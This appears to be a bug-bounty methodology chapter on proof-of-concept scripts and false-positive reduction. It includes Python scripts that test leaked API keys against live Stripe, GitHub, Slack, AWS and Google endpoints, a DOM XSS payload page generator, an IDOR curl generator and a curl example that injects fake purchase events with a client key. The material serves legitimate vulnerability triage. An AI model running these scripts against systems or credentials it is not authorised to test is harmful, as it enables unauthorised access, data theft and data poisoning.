# 07 — PoC Scripting & False Positive Reduction

## Philosophy
**Never report a finding without dynamic confirmation.** Static analysis gives leads, not proofs.
Every finding needs a PoC script that a triager can run in 60 seconds.

---

## False Positive Checklist

Before reporting, verify:
- [ ] Is the token/key still active? (validate with the API)
- [ ] Is the endpoint actually reachable? (not dead code or dead route)
- [ ] Is the endpoint accessible without auth? (test with no cookies/headers)
- [ ] Does the "hardcoded ID" belong to a real user? (check response content)
- [ ] Does the DOM XSS actually execute, not just reflect?
- [ ] Is the "prototype pollution" sink actually reachable from user input?

---

## PoC 1: Validate API Key / Token

```python
# scripts/validate_api_key.py
"""
Tests a discovered API key against its respective API to confirm it's active.
"""
import sys, requests, json

key = sys.argv[1]
key_type = sys.argv[2] if len(sys.argv) > 2 else "unknown"

validators = {
    "aws": lambda k: requests.get(
        "https://sts.amazonaws.com/?Action=GetCallerIdentity&Version=2011-06-15",
        headers={"Authorization": f"AWS4-HMAC-SHA256 Credential={k}"}
    ),
    "sendgrid": lambda k: requests.get(
        "https://api.sendgrid.com/v3/user/profile",
        headers={"Authorization": f"Bearer {k}"}
    ),
    "stripe": lambda k: requests.get(
        "https://api.stripe.com/v1/charges?limit=1",
        auth=(k, "")
    ),
    "github": lambda k: requests.get(
        "https://api.github.com/user",
        headers={"Authorization": f"token {k}"}
    ),
    "slack": lambda k: requests.post(
        "https://slack.com/api/auth.test",
        data={"token": k}
    ),
    "google": lambda k: requests.get(
        f"https://www.googleapis.com/oauth2/v1/tokeninfo?access_token={k}"
    ),
}

if key_type in validators:
    r = validators[key_type](key)
    print(f"[STATUS] {r.status_code}")
    print(f"[RESPONSE] {r.text[:300]}")
    if r.status_code in [200, 201]:
        print(f"\n[CONFIRMED] Key is VALID — {key_type} API accepted it!")
    elif r.status_code == 401:
        print(f"\n[FP] Key is INVALID / expired")
    else:
        print(f"\n[UNCERTAIN] Status {r.status_code} — manual review needed")
else:
    # Generic: try as Bearer token
    print(f"[?] Unknown key type — attempting generic validation...")
    # Common patterns
    for endpoint in [
        "https://api.github.com/user",
        "https://api.stripe.com/v1/customers?limit=1",
    ]:
        try:
            r = requests.get(endpoint, headers={"Authorization": f"Bearer {key}"}, timeout=5)
            if r.status_code == 200:
                print(f"[CONFIRMED] Accepted at {endpoint}: {r.text[:200]}")
                break
        except: pass
```

---

## PoC 2: Minimal DOM XSS PoC HTML

```python
# scripts/generate_xss_poc.py
"""
Generates a standalone HTML PoC file for a DOM XSS finding.
"""
import sys

target_url = sys.argv[1]
param      = sys.argv[2]
sink_type  = sys.argv[3] if len(sys.argv) > 3 else "hash"

payloads = {
    "hash":   f"{target_url}#{param}=<img src=x onerror=alert(document.domain)>",
    "query":  f"{target_url}?{param}=<img src=x onerror=alert(document.domain)>",
    "path":   f"{target_url}/<img src=x onerror=alert(document.domain)>",
}

poc_url = payloads.get(sink_type, payloads["hash"])

poc_html = f"""<!DOCTYPE html>
<html>
<head><title>DOM XSS PoC - JSRA</title></head>
<body>
<h2>DOM XSS Proof of Concept</h2>
<p><strong>Target:</strong> {target_url}</p>
<p><strong>Parameter:</strong> {param}</p>
<p><strong>Sink Type:</strong> {sink_type}</p>
<p><strong>PoC URL:</strong> <a href="{poc_url}" target="_blank">{poc_url}</a></p>
<hr>
<h3>Reproduction Steps:</h3>
<ol>
<li>Open the PoC URL below in a browser</li>
<li>Observe JavaScript execution (alert with document.domain)</li>
</ol>
<a href="{poc_url}" target="_blank">
  <button>Click to Trigger XSS PoC</button>
</a>
<script>
// Auto-open in iframe for demonstration
var iframe = document.createElement('iframe');
iframe.src = "{poc_url}";
iframe.style.width = "100%";
iframe.style.height = "300px";
document.body.appendChild(iframe);
</script>
</body>
</html>"""

with open("xss_poc.html", "w") as f:
    f.write(poc_html)
print(f"[+] PoC saved to xss_poc.html")
print(f"[+] PoC URL: {poc_url}")
```

---

## PoC 3: IDOR PoC curl Command Generator

```python
# scripts/generate_idor_poc.py
import sys, json

endpoint   = sys.argv[1]  # e.g. https://api.target.com/user/{id}/data
victim_id  = sys.argv[2]
attacker_token = sys.argv[3]

poc_curl = f"""# IDOR Proof of Concept
# Attacker accesses victim's data using their own auth token

curl -s -X GET \\
  '{endpoint.replace("{id}", victim_id)}' \\
  -H 'Authorization: Bearer {attacker_token}' \\
  -H 'Content-Type: application/json'

# Expected: Should return 403/404
# Actual: Returns victim's data (IDOR confirmed)
"""

print(poc_curl)
with open("idor_poc.sh", "w") as f:
    f.write(poc_curl)
print("[+] PoC saved to idor_poc.sh")
```

---

## PoC 4: Aggregated Finding Validator

```python
# scripts/validate_all_findings.py
"""
Takes static_findings.json and validates each finding dynamically.
Outputs confirmed_findings.json with false positives removed.
"""
import json, requests, re, sys

with open("static_findings.json") as f:
    findings = json.load(f)

confirmed = []
false_positives = []

TOKEN_VALIDATORS = {
    "GitHub_Token": lambda t: requests.get("https://api.github.com/user",
        headers={"Authorization": f"token {t}"}, timeout=5).status_code == 200,
    "Slack_Token": lambda t: requests.post("https://slack.com/api/auth.test",
        data={"token": t}, timeout=5).json().get("ok", False),
    "AWS_Access_Key": lambda k: "not validated" ,  # requires full SigV4
}

for finding in findings:
    pattern = finding["pattern"]
    match   = finding["match"]

    # Auto-validate tokens
    if pattern in TOKEN_VALIDATORS:
        try:
            valid = TOKEN_VALIDATORS[pattern](match)
            if valid:
                finding["confirmed"] = True
                confirmed.append(finding)
                print(f"[CONFIRMED] {pattern}: {match[:40]}...")
            else:
                finding["confirmed"] = False
                false_positives.append(finding)
                print(f"[FP] {pattern}: token invalid/expired")
        except:
            finding["confirmed"] = "unknown"
            confirmed.append(finding)  # keep for manual review
    else:
        # Non-auto-validatable — keep for manual review
        finding["confirmed"] = "manual_review"
        confirmed.append(finding)

with open("confirmed_findings.json", "w") as f:
    json.dump(confirmed, f, indent=2)

print(f"\n[RESULT] {len(confirmed)} confirmed/manual-review | {len(false_positives)} false positives removed")
print(f"[+] Confirmed findings saved to confirmed_findings.json")
```

---

## Advanced FP-Reduction & Impact Framing (v2)

### Client key vs server key — do NOT report a public key as a "secret"

Public-by-design keys → reporting them as a leak = **N/A**. This includes:
`pk_live_…`, Firebase web `apiKey`, Google Maps browser key, Statsig/Segment/LaunchDarkly
`client-…`, Algolia **search-only** key.

A client key becomes a real finding **only when it grants more than intended**:

- **Analytics / feature-flag key that accepts event/log WRITES** → poison A/B tests & revenue
  dashboards. Lead the report with **data-integrity impact**, not "leaked key."
  ```bash
  curl -sX POST "https://api.<vendor>.com/v1/log_event" -H "<VENDOR>-API-KEY: client-…" \
    -H 'Content-Type: application/json' \
    -d '{"events":[{"eventName":"purchase_verified","value":5000,"user":{"userID":"x"}}]}'
  # HTTP 202 = injection works.
  ```
- **Algolia key with write/admin ACL**, **Firebase with world read/write rules**, **Mapbox `sk.`**
  (secret scope). Test the actual privilege before deciding severity.
- Server keys (`sk_live_`, `sk-`, service tokens, `client_secret`) → always in scope → hand to `jsmax`.

### Version-diff findings need a LIVE re-check

A secret/endpoint found only in an OLD Wayback bundle is a finding **only if it still works NOW**.
Re-fetch / re-auth against production before reporting — otherwise it's a historical FP.

### Source-map recovery is evidence, not a bug by itself

A `.js.map` in prod is at most Low (info disclosure) on its own. Use it to FIND the real bug
(secrets, auth logic, internal endpoints in the recovered source), then report THAT, with the
exposed map as the lead-in. Don't submit "source map enabled" as a standalone P-anything.

### The 60-second triager rule still applies

Every PoC above must run in one paste with no setup. If confirming your finding needs the triager
to install tooling or run a multi-step harness, tighten the PoC to a single `curl` / single URL
before submitting.
